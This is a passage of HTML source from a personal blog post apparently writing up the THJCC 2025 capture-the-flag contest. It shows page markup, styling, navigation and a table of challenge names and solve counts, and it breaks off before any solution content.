<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
  data-auto-appearance="false"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>THJCC 2025 題解 &middot; hokak の sweet home</title>
  <meta name="title" content="THJCC 2025 題解 &middot; hokak の sweet home" />
  
  
  
  
  
  <link rel="canonical" href="http://localhost:1313/posts/thjcc-2025/" />
  
  
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.48faddc4b37527001482cb057ea9e2a46db3b1fdf09fe02e52e459bf31ac71ecf511c59eedaecb5b3b42b178c0b6de4ca1781214da1725da50dd84b789512819.css"
    integrity="sha512-SPrdxLN1JwAUgssFfqnipG2zsf3wn&#43;AuUuRZvzGscez1EcWe7a7LWztCsXjAtt5MoXgSFNoXJdpQ3YS3iVEoGQ==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.c9658ec94486565aff073b0f09a4111942679211c19430908a6707077da499e04b9bd040a9632aa673ce252f68e4470a661d46b19168671122846ad0a1e5c38c.js"
    integrity="sha512-yWWOyUSGVlr/BzsPCaQRGUJnkhHBlDCQimcHB32kmeBLm9BAqWMqpnPOJS9o5EcKZh1GsZFoZxEihGrQoeXDjA=="></script>
  
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.8b56b0fd46524eaecbfe33f576b8ba2cd2a122521a89f8229a95be0b635a7ac8e774eb1d8b8b93b32bbd677c3deb734aeea62917443f124d5bf5478859767380.js"
    integrity="sha512-i1aw/UZSTq7L/jP1dri6LNKhIlIaifgimpW&#43;C2NaesjndOsdi4uTsyu9Z3w963NK7qYpF0Q/Ek1b9UeIWXZzgA==" data-copy="" data-copied=""></script>
  
  <script type="text/javascript">
    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "q0a8ugdoi9");
</script>
  
  
  <script src="/lib/zoom/zoom.min.fcbc7f7b3dcea96e3b5570cd322c5d7a12d5351c87f9889b1c31745a2cc711df58f6b70795a86d50e63813b236ade916668332c10a70a4ce26f7c0878f525fce.js" integrity="sha512-/Lx/ez3OqW47VXDNMixdehLVNRyH&#43;YibHDF0WizHEd9Y9rcHlahtUOY4E7I2rekWZoMywQpwpM4m98CHj1Jfzg=="></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  <meta property="og:url" content="http://localhost:1313/posts/thjcc-2025/">
  <meta property="og:site_name" content="hokak の sweet home">
  <meta property="og:title" content="THJCC 2025 題解">
  <meta property="og:description" content="解題狀況 #category diffculity challenge solves Crypto easy Twins 85 Crypto easy SNAKE 77 Crypto medium Yoshino’s Secret 30 Crypto medium Speeded Block Cipher 25 Crypto hard Proactive Planning 4 Pwn easy Money Overflow 59 Pwn easy Insecure Shell 37 Pwn medium Once 19 Pwn hard Bank Clerk 5 Pwn hard Painter 3 Reverse baby 西 100 Reverse medium Flag Checker 31 Reverse medium Noo dle 22 Reverse hard Empty 13 Reverse hard Demon Summoning 12 沒跟預想的差很多:D">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-04-21T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-04-21T00:00:00+00:00">

  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="THJCC 2025 題解">
  <meta name="twitter:description" content="解題狀況 #category diffculity challenge solves Crypto easy Twins 85 Crypto easy SNAKE 77 Crypto medium Yoshino’s Secret 30 Crypto medium Speeded Block Cipher 25 Crypto hard Proactive Planning 4 Pwn easy Money Overflow 59 Pwn easy Insecure Shell 37 Pwn medium Once 19 Pwn hard Bank Clerk 5 Pwn hard Painter 3 Reverse baby 西 100 Reverse medium Flag Checker 31 Reverse medium Noo dle 22 Reverse hard Empty 13 Reverse hard Demon Summoning 12 沒跟預想的差很多:D">

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "THJCC 2025 題解",
    "headline": "THJCC 2025 題解",
    
    "abstract": "解題狀況 #\rcategory diffculity challenge solves Crypto easy Twins 85 Crypto easy SNAKE 77 Crypto medium Yoshino\u0026rsquo;s Secret 30 Crypto medium Speeded Block Cipher 25 Crypto hard Proactive Planning 4 Pwn easy Money Overflow 59 Pwn easy Insecure Shell 37 Pwn medium Once 19 Pwn hard Bank Clerk 5 Pwn hard Painter 3 Reverse baby 西 100 Reverse medium Flag Checker 31 Reverse medium Noo dle 22 Reverse hard Empty 13 Reverse hard Demon Summoning 12 沒跟預想的差很多:D",
    "inLanguage": "en",
    "url" : "http:\/\/localhost:1313\/posts\/thjcc-2025\/",
    "author" : {
      "@type": "Person",
      "name": "hokak"
    },
    "copyrightYear": "2025",
    "dateCreated": "2025-04-21T00:00:00\u002b00:00",
    "datePublished": "2025-04-21T00:00:00\u002b00:00",
    
    "dateModified": "2025-04-21T00:00:00\u002b00:00",
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "2946"
  }]
  </script>


  
  
  <meta name="author" content="hokak" />
  
  
  
  <link href="https://github.com/asia-hokak" rel="me" />
  
  
  <link href="mailto:hokak65535@gmail.com" rel="me" />
  
  
  <link href="https://www.instagram.com/hokak_/" rel="me" />
  
  
  <link href="https://www.facebook.com/asiahokak/" rel="me" />
  
  
  <link href="https://steamcommunity.com/id/CreeperSH/" rel="me" />
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js" integrity="sha512-A8sWDjz9smZ6LiyA0oO&#43;vPY/&#43;LvEtinJqyur9vrh0MB61HDtrng&#43;&#43;k&#43;r2irAHFjWDmO5izwza&#43;gghGDwj0NU9Q=="></script>






















  
  



  
  
  <meta name="theme-color"/>
  
  
  
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
  <script>

    const firebaseConfig = {
      apiKey: "AIzaSyDXc0kiO2x27W1Drm-E3WLhl1qO21pUUbk",
      authDomain: "AIzaSyDXc0kiO2x27W1Drm-E3WLhl1qO21pUUbk",
      projectId: "hokak-blog",
      storageBucket:  null ,
      messagingSenderId: "580240083167",
      appId: "1:580240083167:web:878c469b74773f11acc16a",
      measurementId: "G-H6M7TG92EV"
    };

    var app = firebase.initializeApp(firebaseConfig);
    var db = firebase.firestore();
    var auth = firebase.auth();

  </script>
  
  
  <link rel="stylesheet" href="/css/main.css">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Noto+Sans+JP&family=Noto+Sans+TC&display=swap" rel="stylesheet">

</head>
<script type="text/javascript" async
  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML">
</script>
<script>
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [['$','$'], ['\\(','\\)']],
        displayMath: [['$$$$$$','$$$$$$'], ['\\[','\\]']],
        processEscapes: true,
        processEnvironments: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
        TeX: { equationNumbers: { autoNumber: "AMS" },
             extensions: ["AMSmath.js", "AMSsymbols.js"] }
      }
    });
      MathJax.Hub.Queue(function() {            var all = MathJax.Hub.getAllJax(), i;
        for(i = 0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<style>
    code.has-jax {font: inherit;
              font-size: 100%;
              background: inherit;
              border: inherit;
              color: #515151;}
</style><body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
  
  

  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div class="min-h-[148px]"></div>
<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
  <div class="relative max-w-[64rem] ml-auto mr-auto">
    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
    
    
    
    <div>
        <a href="/" class="flex">
            <span class="sr-only">hokak の sweet home</span>

            
            <img src="/img/sitelogo.png" width="592" height="592"
                class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="hokak の sweet home" />
            

        </a>
    </div>
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">hokak の sweet home</a>
            

        </nav>
        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">

            
            
            
  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        About
    </p>
</a>



            
            
  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Posts
    </p>
</a>



            
            
  <a href="/writeups/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Writeups
    </p>
</a>



            
             
  <div>
  <div class="cursor-pointer flex items-center nested-menu">
    
    <a  class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
      Notes
    </a>
    <span>
      

  <span class="relative block icon">
    <svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>

  </span>


    </span>
  </div>
  <div class="absolute menuhide">
    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
      <div class="flex flex-col space-y-3">
        
        <a href="/notes/web/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            Web
          </p>
        </a>
        
        <a href="/notes/crypto/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            Crypto
          </p>
        </a>
        
        <a href="/notes/reverse/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            Reverse
          </p>
        </a>
        
        <a href="/notes/pwn/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            Pwn
          </p>
        </a>
        
        <a href="/notes/misc/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            Misc
          </p>
        </a>
        
        <a href="/notes/algo/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            Algo
          </p>
        </a>
        
        <a href="/notes/tools/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            Tools
          </p>
        </a>
        
        <a href="/notes/others/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
          
          <p class="text-sm font-sm" title="">
            Others
          </p>
        </a>
        
      </div>
    </div>
  </div>
</div>



            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            

        </nav>
        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            

        </div>
    </div>
    <div class="-my-2 -mr-2 md:hidden">

        <label id="menu-button" for="menu-controller" class="block">
            <input type="checkbox" id="menu-controller" class="hidden" />
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li>
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            About
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Posts
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/writeups/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Writeups
        </p>
    </a>
</li>




                    

                     
  <li class="mt-1">
    <a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Notes
        </p>
        <span>
            

  <span class="relative block icon">
    <svg
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 20 20"
  fill="currentColor"
  aria-hidden="true"
>
  <path
    fill-rule="evenodd"
    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
    clip-rule="evenodd"
  />
</svg>

  </span>


        </span>
    </a>
</li>

<li class="mt-1">
    <a href="/notes/web/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            Web
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/notes/crypto/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            Crypto
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/notes/reverse/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            Reverse
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/notes/pwn/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            Pwn
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/notes/misc/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            Misc
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/notes/algo/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            Algo
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/notes/tools/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            Tools
        </p>
    </a>
</li>

<li class="mt-1">
    <a href="/notes/others/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-sm font-small" title="">
            Others
        </p>
    </a>
</li>

<li class="mb-2"></li>




                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>




<script>
    (function () {
        var $mainmenu = $('.main-menu');
        var path = window.location.pathname;
        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
            $(e).children('p').addClass('active');
        });
    })();
</script>


  </div>
</div>
<script>
  window.addEventListener('scroll', function (e) {
    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
    var background_blur = document.getElementById('menu-blur');
    background_blur.style.opacity = (scroll / 300);
  });
</script>

  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  
  
  
  
  
  








<div id="hero" class="h-[150px] md:h-[200px]"></div>




    
    <div id = 'background-container' class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
    style="background-image:url(' /img/article.png ');">
    
    


    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
    </div>
    <div
        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
    </div>
</div>

<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
<script>
    window.addEventListener('scroll', function (e) {
        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
        var background_blur = document.getElementById('background-blur');
        background_blur.style.opacity = (scroll / 300)
    });
</script>
<style>
    .chroma {
  color: #c6d0f5;
  background-color: #303446;
}
.chroma .cl {
  color: #c6d0f5;
}
.chroma .err {
  color: #e78284;
}
.chroma .x {
  color: #c6d0f5;
}
.chroma .lntd {
  border: 0;
  margin: 0;
  padding: 0;
  vertical-align: top;
}
.chroma .lntable {
  width: auto;
  border: 0;
  margin: 0;
  display: block;
  padding: 0;
  overflow: auto;
  border-spacing: 0;
}
.chroma .hl {
  width: 100%;
  display: block;
  background-color: #51576d;
}
.chroma .lnt {
  color: #838ba7;
  padding: 0 0.4em 0 0.4em;
  font-size: 0.875rem;
  margin-right: 0.4em;
}
.chroma .ln {
  color: #838ba7;
  padding: 0 0.4em 0 0.4em;
  margin-right: 0.4em;
}
.chroma .k {
  color: #ca9ee6;
}
.chroma .kr {
  color: #ca9ee6;
}
.chroma .kp {
  color: #ca9ee6;
}
.chroma .kc {
  color: #ef9f76;
}
.chroma .kd {
  color: #e78284;
}
.chroma .kn {
  color: #81c8be;
}
.chroma .kt {
  color: #e78284;
}
.chroma .n {
  color: #c6d0f5;
}
.chroma .nc {
  color: #e5c890;
}
.chroma .no {
  color: #e5c890;
}
.chroma .nd {
  color: #8caaee;
  font-weight: bold;
}
.chroma .ni {
  color: #81c8be;
}
.chroma .ne {
  color: #ef9f76;
}
.chroma .nf {
  color: #8caaee;
}
.chroma .fm {
  color: #8caaee;
}
.chroma .nl {
  color: #99d1db;
}
.chroma .nn {
  color: #ef9f76;
}
.chroma .py {
  color: #ef9f76;
}
.chroma .nt {
  color: #ca9ee6;
}
.chroma .nv {
  color: #f2d5cf;
}
.chroma .vc {
  color: #f2d5cf;
}
.chroma .vg {
  color: #f2d5cf;
}
.chroma .vi {
  color: #f2d5cf;
}
.chroma .vm {
  color: #f2d5cf;
}
.chroma .na {
  color: #8caaee;
}
.chroma .nb {
  color: #99d1db;
}
.chroma .bp {
  color: #99d1db;
}
.chroma .nx {
  color: #c6d0f5;
}
.chroma .l {
  color: #c6d0f5;
}
.chroma .ld {
  color: #c6d0f5;
}
.chroma .s {
  color: #a6d189;
}
.chroma .sc {
  color: #a6d189;
}
.chroma .s1 {
  color: #a6d189;
}
.chroma .s2 {
  color: #a6d189;
}
.chroma .sb {
  color: #a6d189;
}
.chroma .sx {
  color: #a6d189;
}
.chroma .ss {
  color: #a6d189;
}
.chroma .si {
  color: #a6d189;
}
.chroma .sa {
  color: #e78284;
}
.chroma .dl {
  color: #8caaee;
}
.chroma .se {
  color: #8caaee;
}
.chroma .sr {
  color: #81c8be;
}
.chroma .sd {
  color: #737994;
}
.chroma .sh {
  color: #737994;
}
.chroma .m {
  color: #ef9f76;
}
.chroma .mb {
  color: #ef9f76;
}
.chroma .mh {
  color: #ef9f76;
}
.chroma .mi {
  color: #ef9f76;
}
.chroma .mf {
  color: #ef9f76;
}
.chroma .il {
  color: #ef9f76;
}
.chroma .mo {
  color: #ef9f76;
}
.chroma .o {
  color: #99d1db;
  font-weight: bold;
}
.chroma .ow {
  color: #99d1db;
  font-weight: bold;
}
.chroma .c {
  color: #737994;
  font-style: italic;
}
.chroma .c1 {
  color: #737994;
  font-style: italic;
}
.chroma .cm {
  color: #737994;
  font-style: italic;
}
.chroma .cs {
  color: #737994;
  font-style: italic;
}
.chroma .ch {
  color: #626880;
  font-style: italic;
}
.chroma .cp {
  color: #737994;
  font-style: italic;
}
.chroma .cpf {
  color: #737994;
  font-weight: bold;
}
.chroma .g {
  color: #c6d0f5;
}
.chroma .gi {
  color: #a6d189;
  background-color: #414559;
}
.chroma .gd {
  color: #e78284;
  background-color: #414559;
}
.chroma .ge {
  color: #c6d0f5;
  font-style: italic;
}
.chroma .gs {
  color: #c6d0f5;
  font-weight: bold;
}
.chroma .gl {
  color: #c6d0f5;
  text-decoration: underline;
}
.chroma .gh {
  color: #ef9f76;
  font-weight: bold;
}
.chroma .gu {
  color: #ef9f76;
  font-weight: bold;
}
.chroma .go {
  color: #c6d0f5;
}
.chroma .gp {
  color: #c6d0f5;
}
.chroma .gr {
  color: #e78284;
}
.chroma .gt {
  color: #e78284;
}
</style>

  
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      THJCC 2025 題解
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      





  
  







  







  



  



  



  





  



<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2025-04-21 00:00:00 &#43;0000 UTC">2025-04-21</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">14 mins</span><span class="px-2 text-primary-500">&middot;</span><span>
  
  
    
    
      
      
        
        
      
      
    
  
  <span id="views_posts\THJCC 2025\index.md" class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title="views">loading</span>
  <span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
<path fill="currentColor" d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg>
  </span>

</span>
</span><span class="px-2 text-primary-500">&middot;</span><span>
  
  
    
    
      
      
        
        
      
      
    
  
  <span id="likes_posts\THJCC 2025\index.md"
    class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400"
    title="likes">loading</span>
  <span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
<path fill="currentColor" d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg>
  </span>

</span>
</span><span class="px-2 text-primary-500">&middot;</span><span>
    <button id="button_likes"
        class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
        onclick="process_article()">
        <span id="button_likes_heart" style="display:none" class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
<path fill="currentColor" d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg>
  </span>

 </span>
        <span id="button_likes_emtpty_heart" class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
